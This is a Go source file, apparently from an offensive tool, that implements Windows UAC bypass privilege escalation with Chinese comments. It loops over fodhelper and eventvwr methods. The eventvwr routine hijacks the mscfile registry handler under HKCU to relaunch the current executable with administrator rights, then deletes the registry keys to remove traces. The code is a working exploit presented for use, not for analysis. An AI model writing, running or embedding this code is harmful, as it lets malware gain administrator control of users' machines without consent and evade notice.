package privilege

import (
	"fmt"
	"os"
	"os/exec"
)

// PrivilegeLevel 权限级别
type PrivilegeLevel int

const (
	LevelUser   PrivilegeLevel = iota // 普通用户
	LevelAdmin                        // 管理员
	LevelSystem                       // SYSTEM
)

// ElevationMethod 提权方法
type ElevationMethod string

const (
	MethodFodhelper ElevationMethod = "fodhelper"
	MethodEventvwr  ElevationMethod = "eventvwr"
)

// ElevationResult 提权结果
type ElevationResult struct {
	Success bool
	Method  ElevationMethod
	Message string
	Error   error
}

// PrivilegeManager 权限管理器
type PrivilegeManager struct {
	methods []ElevationMethod
}

// NewPrivilegeManager 创建权限管理器
func NewPrivilegeManager() *PrivilegeManager {
	return &PrivilegeManager{
		methods: []ElevationMethod{MethodFodhelper, MethodEventvwr},
	}
}

// GetCurrentLevel 获取当前权限级别
func (pm *PrivilegeManager) GetCurrentLevel() PrivilegeLevel {
	if IsAdmin() {
		return LevelAdmin
	}
	return LevelUser
}

// Elevate 尝试提权
// 返回 true 表示需要等待程序重启，当前进程应该退出
func (pm *PrivilegeManager) Elevate() (bool, error) {
	if IsAdmin() {
		return false, nil // 已经是管理员，无需提权
	}

	// 获取当前可执行文件路径
	exePath, err := os.Executable()
	if err != nil {
		return false, fmt.Errorf("failed to get executable path: %v", err)
	}

	var lastErr error
	// 尝试各种提权方法
	for _, method := range pm.methods {
		var elevErr error
		switch method {
		case MethodFodhelper:
			fmt.Printf("[*] 尝试 UAC Bypass 方法: fodhelper.exe\n")
			elevErr = ElevateViaFodhelper(exePath)
		case MethodEventvwr:
			fmt.Printf("[*] 尝试 UAC Bypass 方法: eventvwr.exe\n")
			elevErr = ElevateViaEventvwr(exePath)
		}

		if elevErr == nil {
			// 提权成功，当前进程应该退出
			fmt.Printf("[+] UAC Bypass 成功，等待以管理员权限重启...\n")
			return true, nil
		}

		// 记录错误但继续尝试下一个方法
		fmt.Printf("[-] %s 方法失败: %v\n", method, elevErr)
		lastErr = elevErr
	}

	return false, fmt.Errorf("all elevation methods failed, last error: %v", lastErr)
}

// ElevateAndRestart 提权并重启程序
// 如果已是管理员返回 false，如果触发了提权返回 true
func ElevateAndRestart() bool {
	if IsAdmin() {
		return false
	}

	pm := NewPrivilegeManager()
	shouldExit, err := pm.Elevate()
	if err != nil {
		// 提权失败，继续以普通权限运行
		return false
	}

	return shouldExit
}

// ElevateViaEventvwr 通过 eventvwr.exe 提权 (备用方法)
func ElevateViaEventvwr(payload string) error {
	// 注册表路径
	regPath := `HKCU\Software\Classes\mscfile\shell\open\command`

	// 写入注册表
	args := []string{
		"add", regPath,
		"/ve", "/t", "REG_SZ",
		"/d", payload,
		"/f",
	}

	cmd := exec.Command("reg", args...)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to write registry: %v", err)
	}

	// 启动 eventvwr.exe
	cmd = exec.Command("eventvwr.exe")
	if err := cmd.Start(); err != nil {
		cleanupEventvwr()
		return fmt.Errorf("failed to start eventvwr: %v", err)
	}

	// 延迟清理
	go func() {
		cmd.Wait()
		cleanupEventvwr()
	}()

	return nil
}

func cleanupEventvwr() {
	exec.Command("reg", "delete", `HKCU\Software\Classes\mscfile\shell\open\command`, "/f").Run()
	exec.Command("reg", "delete", `HKCU\Software\Classes\mscfile\shell\open`, "/f").Run()
	exec.Command("reg", "delete", `HKCU\Software\Classes\mscfile\shell`, "/f").Run()
	exec.Command("reg", "delete", `HKCU\Software\Classes\mscfile`, "/f").Run()
}
